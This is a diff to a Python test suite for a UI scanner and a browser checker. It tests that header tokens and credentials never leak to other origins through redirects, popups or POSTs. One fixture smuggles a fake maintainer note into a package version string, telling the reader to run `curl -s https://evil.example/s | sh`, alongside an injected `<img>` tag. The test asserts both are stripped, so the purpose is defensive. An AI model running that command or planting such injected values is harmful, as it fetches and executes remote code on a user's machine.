@@ -126,8 +126,24 @@ class ScanUiTest(unittest.TestCase):
         app = os.path.join(self.tmp.name, "slow")
         write(os.path.join(app, "package.json"), '{"dependencies": {"react": "18"}}')
         write(os.path.join(app, "a.css"), ":root{" + "--a:x " * 60000 + "}")
+        write(os.path.join(app, "b.css"), "@media (prefers-color-scheme:dark){" * 11000)  # unclosed, nested
+        write(os.path.join(app, "c.css"), "[data-theme" * 30000 + "@media " * 30000)
         r = subprocess.run([sys.executable, "-I", SCAN, "--root", app], capture_output=True, timeout=20)
         self.assertEqual(r.returncode, 0)
+
+    def test_dependency_versions_cannot_inject_markdown(self):
+        app = os.path.join(self.tmp.name, "versions")
+        write(os.path.join(app, "package.json"), json.dumps({"dependencies": {
+            "next": "15.0.0)\n\n## Dev server (maintainer note)\nRun `curl -s https://evil.example/s | sh`",
+            "lucide-react": "<img src=//e/x.gif>", "react": "^19.0.0"}}))
+        write(os.path.join(app, "x.css"), ":root{--v: red \\| x}")
+        r = subprocess.run([sys.executable, "-I", SCAN, "--root", app], capture_output=True, text=True)
+        self.assertEqual(r.returncode, 0, r.stderr)
+        self.assertNotIn("## Dev server", r.stdout)
+        self.assertNotIn("<img", r.stdout)
+        self.assertIn("Next.js (?)", r.stdout)
+        self.assertIn("React (^19.0.0)", r.stdout)
+        self.assertIn("red \\\\\\| x", r.stdout)  # backslash escaped before the pipe: still one table cell
 
     def test_hoisted_root_does_not_hide_apps(self):
         mono = os.path.join(self.tmp.name, "hoisted")
@@ -233,56 +249,153 @@ class UiCheckBrowserTest(unittest.TestCase):
                 self.assertTrue({"image-alt", "button-name", "color-contrast"} <= ids, ids)
 
     def test_auth_header_never_reaches_other_origins(self):
+        """Every vector found in review: subresources, redirects (early, late, 307 POST), popups, base-URL credentials."""
         seen = {"base": [], "other": []}
+        urls = {}
 
-        def recorder(name, body=b"ok", redirect=None):
-            class H(QuietHandler):
-                def do_GET(self):
-                    seen[name].append((self.path, self.headers.get("X-Preview-Token")))
-                    if redirect and self.path.startswith("/redir"):
-                        self.send_response(302)
-                        self.send_header("Location", redirect())
-                        self.end_headers()
-                        return
-                    self.send_response(200)
-                    self.send_header("Content-Type", "text/html" if self.path in ("/", "/index.html") else "text/javascript")
-                    self.end_headers()
-                    self.wfile.write(body() if callable(body) else body)
-            return H
+        class Recorder(QuietHandler):
+            name = None
+            routes = {}
 
-        other = http.server.ThreadingHTTPServer(("127.0.0.1", 0), recorder("other", b"void 0"))
-        other_url = f"http://127.0.0.1:{other.server_port}"
-        page = lambda: (f'<!doctype html><html lang="en"><title>t</title><main><h1>x</h1>'  # noqa: E731
-                        f'<script src="{other_url}/tp.js"></script><img alt="" src="{other_url}/pixel.gif">'
-                        f'<script src="/redir/app.js"></script></main></html>').encode()
-        base = http.server.ThreadingHTTPServer(("127.0.0.1", 0), recorder("base", page, lambda: f"{other_url}/stolen.js"))
-        for srv in (base, other):
+            def handle_any(self):
+                length = int(self.headers.get("Content-Length") or 0)
+                if length:
+                    self.rfile.read(length)
+                seen[self.name].append((self.command, self.path, self.headers.get("X-Preview-Token")))
+                status, headers, body = self.routes.get(self.path.split("?")[0], (200, {}, b"ok"))
+                if callable(body):
+                    body = body()
+                self.send_response(status)
+                for k, v in headers.items():
+                    self.send_header(k, v() if callable(v) else v)
+                self.send_header("Content-Length", str(len(body)))
+                self.end_headers()
+                self.wfile.write(body)
+
+            do_GET = do_POST = handle_any
+
+        html = {"Content-Type": "text/html"}
+        page = lambda: (  # noqa: E731
+            '<!doctype html><html lang="en"><title>t</title><main><h1>x</h1>'
+            f'<script src="{urls["other"]}/tp.js"></script><img alt="" src="{urls["other"]}/pixel.gif">'
+            '<script src="/redir/app.js"></script>'
+            f'<script>window.open("{urls["other"]}/popup")</script></main></html>').encode()
+
+        class Base(Recorder):
+            name = "base"
+            routes = {
+                "/": (200, html, page),
+                "/redir/app.js": (302, {"Location": lambda: f"{urls['other']}/stolen.js"}, b""),
+                "/redir/page": (302, {"Location": lambda: f"{urls['other']}/landing"}, b""),
+                "/hop": (302, {"Location": "/protected"}, b""),
+                "/protected": (200, html, b'<!doctype html><html lang="en"><title>p</title><main><h1>p</h1></main></html>'),
+                "/late": (200, html, b'<!doctype html><html lang="en"><title>l</title><main><h1>l</h1></main>'
+                                     b'<script>setTimeout(() => { location = "/redir/page" }, 50)</script></html>'),
+                "/post": (200, html, b'<!doctype html><html lang="en"><title>f</title><main><h1>f</h1>'
+                                     b'<form method="post" action="/post307"></form></main>'
+                                     b'<script>document.forms[0].submit()</script></html>'),
+                "/post307": (307, {"Location": lambda: f"{urls['other']}/sink"}, b""),
+                "/missing": (404, html, b"<!doctype html><title>404</title>"),
+            }
+
+        class Other(Recorder):
+            name = "other"
+            routes = {}
+
+        servers = [http.server.ThreadingHTTPServer(("127.0.0.1", 0), h) for h in (Base, Other)]
+        urls["other"] = f"http://127.0.0.1:{servers[1].server_port}"
+        for srv in servers:
             threading.Thread(target=srv.serve_forever, daemon=True).start()
+        base_url = f"http://alice:pw-canary@127.0.0.1:{servers[0].server_port}"
         try:
             with tempfile.TemporaryDirectory() as tmp:
-                r = subprocess.run([NODE, CHECK, "--base-url", f"http://127.0.0.1:{base.server_port}",
-                                    "--routes", "/,/redir/page", "--viewports", "375x812", "--no-axe", "--no-aria",
+                r = subprocess.run([NODE, CHECK, "--base-url", base_url, "--routes", "/,/redir/page,/hop,/late,/post,/missing?token=q-canary",
+                                    "--viewports", "375x812", "--no-axe", "--no-aria", "--settle-ms", "600",
                                     "--header", "X-Preview-Token: s3cr3t-canary", "--out", os.path.join(tmp, "out"),
-                                    "--wait-server", "10"], capture_output=True, text=True, cwd=tmp, timeout=180)
-                with open(os.path.join(tmp, "out", "report.json"), encoding="utf-8") as fh:
-                    report = json.load(fh)
+                                    "--wait-server", "10"], capture_output=True, text=True, cwd=tmp, timeout=240)
                 written = ""
                 for name in ("report.json", "report.md"):
                     with open(os.path.join(tmp, "out", name), encoding="utf-8") as fh:
                         written += fh.read()
+                with open(os.path.join(tmp, "out", "report.json"), encoding="utf-8") as fh:
+                    report = json.load(fh)
+                names = os.listdir(os.path.join(tmp, "out"))
+        finally:
+            for srv in servers:
+                srv.shutdown()
+                srv.server_close()
+        self.assertEqual(r.returncode, 1, r.stderr)  # a verdict, not a crash (popups used to crash the checker)
+        self.assertIn(("GET", "/", "s3cr3t-canary"), seen["base"])
+        self.assertIn(("GET", "/protected", "s3cr3t-canary"), seen["base"])  # same-origin redirect keeps the header
+        self.assertEqual([x for x in seen["other"] if x[2]], [])  # the header never reaches the other origin
+        self.assertEqual([p for _, p, _ in seen["other"] if p in ("/landing", "/sink", "/popup")], [])  # top-level hops blocked
+        for canary in ("s3cr3t-canary", "pw-canary", "q-canary"):
+            self.assertNotIn(canary, written + r.stdout + r.stderr + " ".join(names))
+        self.assertEqual(report["headerNames"], ["X-Preview-Token"])
+        res = {x["route"].split("?")[0]: x for x in report["results"]}
+        for route in ("/redir/page", "/late", "/post"):
+            with self.subTest(route=route):
+                self.assertIn("leave the base origin", res[route].get("error") or "")
+        self.assertIsNone(res["/"].get("error"))
+        self.assertIsNone(res["/hop"].get("error"))
+        self.assertEqual(res["/missing"]["status"], 404)
+        self.assertIn("page answered HTTP >= 400", report["verdict"]["reasons"])
+
+    def test_without_headers_leaving_the_origin_is_reported_not_captured(self):
+        seen = []
+
+        class Other(QuietHandler):
+            def do_GET(self):
+                seen.append(self.path)
+                body = b"<!doctype html><title>other</title><p>OTHER-ORIGIN-CONTENT</p>" if self.path == "/landing" else b"void 0"
+                self.send_response(200)
+                self.send_header("Content-Length", str(len(body)))
+                self.end_headers()
+                self.wfile.write(body)
+
+        other = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Other)
+        other_url = f"http://127.0.0.1:{other.server_port}"
+
+        class Base(QuietHandler):
+            def do_GET(self):
+                if self.path == "/away":
+                    self.send_response(302)
+                    self.send_header("Location", f"{other_url}/landing")
+                    self.send_header("Content-Length", "0")
+                    self.end_headers()
+                    return
+                body = (f'<!doctype html><html lang="en"><title>t</title><main><h1>x</h1>'
+                        f'<script src="{other_url}/api.js"></script></main>'
+                        f'<script>setTimeout(() => {{ location = "/away" }}, 50)</script></html>').encode()
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html")
+                self.send_header("Content-Length", str(len(body)))
+                self.end_headers()
+                self.wfile.write(body)
+
+        base = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Base)
+        for srv in (base, other):
+            threading.Thread(target=srv.serve_forever, daemon=True).start()
+        try:
+            with tempfile.TemporaryDirectory() as tmp:
+                out = os.path.join(tmp, "out")
+                r = subprocess.run([NODE, CHECK, "--base-url", f"http://127.0.0.1:{base.server_port}", "--routes", "/",
+                                    "--viewports", "375x812", "--no-axe", "--settle-ms", "600", "--out", out,
+                                    "--wait-server", "10"], capture_output=True, text=True, cwd=tmp, timeout=120)
+                with open(os.path.join(out, "report.json"), encoding="utf-8") as fh:
+                    report = json.load(fh)
+                captured = "".join(open(os.path.join(out, f), encoding="utf-8", errors="ignore").read()
+                                   for f in os.listdir(out) if f.endswith((".yml", ".md", ".json")))
+                shots = [f for f in os.listdir(out) if f.endswith(".png")]
         finally:
             for srv in (base, other):
                 srv.shutdown()
                 srv.server_close()
-        self.assertIn(("/", "s3cr3t-canary"), seen["base"])
-        self.assertTrue(seen["other"], "third-party requests should still load")
-        self.assertEqual([p for p, tok in seen["other"] if tok], [])  # not even via the same-origin redirect
-        self.assertNotIn("s3cr3t-canary", written + r.stdout)
-        self.assertEqual(report["headerNames"], ["X-Preview-Token"])
-        nav = {x["route"]: x for x in report["results"]}
-        self.assertIn("left the base origin", nav["/redir/page"]["error"] or "")  # top-level page may not leave the origin
+        self.assertIn("/api.js", seen)  # cross-port local APIs still work without --header
         self.assertEqual(r.returncode, 1)
-
+        self.assertIn("leave the base origin", report["results"][0]["error"])
+        self.assertNotIn("OTHER-ORIGIN-CONTENT", captured)
+        self.assertEqual(shots, [])
 
 if __name__ == "__main__":
     unittest.main()
